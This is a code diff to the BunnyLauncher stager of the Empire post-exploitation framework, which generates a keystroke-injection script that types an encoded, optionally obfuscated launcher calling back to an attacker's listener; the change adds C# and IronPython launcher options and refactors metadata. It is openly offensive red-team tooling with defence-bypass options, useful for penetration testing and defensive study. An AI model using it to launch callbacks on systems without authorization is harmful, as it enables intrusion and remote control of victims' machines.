@@ -1,16 +1,29 @@
 from __future__ import print_function
 
+import logging
 from builtins import object
 
 from empire.server.common import helpers
 
+log = logging.getLogger(__name__)
+
 
 class Stager(object):
     def __init__(self, mainMenu, params=[]):
-
         self.info = {
             "Name": "BunnyLauncher",
-            "Author": ["@kisasondi", "@harmj0y"],
+            "Authors": [
+                {
+                    "Name": "Will Schroeder",
+                    "Handle": "@harmj0y",
+                    "Link": "https://twitter.com/harmj0y",
+                },
+                {
+                    "Name": "",
+                    "Handle": "@kisasondi",
+                    "Link": "",
+                },
+            ],
             "Description": "Generates a bunny script that runs a one-liner stage0 launcher for Empire.",
             "Comments": [
                 "This stager is modification of the ducky stager by @harmj0y,",
@@ -18,10 +31,7 @@ class Stager(object):
             ],
         }
 
-        # any options needed by the stager, settable during runtime
         self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
             "Listener": {
                 "Description": "Listener to generate stager for.",
                 "Required": True,
@@ -50,7 +60,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
             "Keyboard": {
@@ -93,12 +103,9 @@ class Stager(object):
             },
         }
 
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
         for param in params:
-            # parameter format is [Name, Value]
             option, value = param
             if option in self.options:
                 self.options[option]["Value"] = value
@@ -121,19 +128,39 @@ class Stager(object):
             obfuscate_script = True
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
 
-        # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(
-            listener_name,
-            language=language,
-            encode=True,
-            obfuscate=obfuscate_script,
-            obfuscationCommand=obfuscate_command,
-            userAgent=user_agent,
-            proxy=proxy,
-            proxyCreds=proxy_creds,
-            stagerRetries=stager_retries,
-            bypasses=bypasses,
-        )
+        if language == "powershell":
+            # generate the launcher code
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listener_name,
+                language=language,
+                encode=True,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                stagerRetries=stager_retries,
+                bypasses=bypasses,
+            )
+        elif language in ["csharp", "ironpython"]:
+            if (
+                self.mainMenu.listenersv2.get_active_listener_by_name(
+                    listener_name
+                ).info["Name"]
+                != "HTTP[S]"
+            ):
+                log.error(
+                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
+                )
+                return ""
+
+            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate_script,
+                obfuscation_command=obfuscate_command,
+                encode=True,
+                listener_name=listener_name,
+            )
 
         if launcher == "":
             print(helpers.color("[!] Error in launcher command generation."))
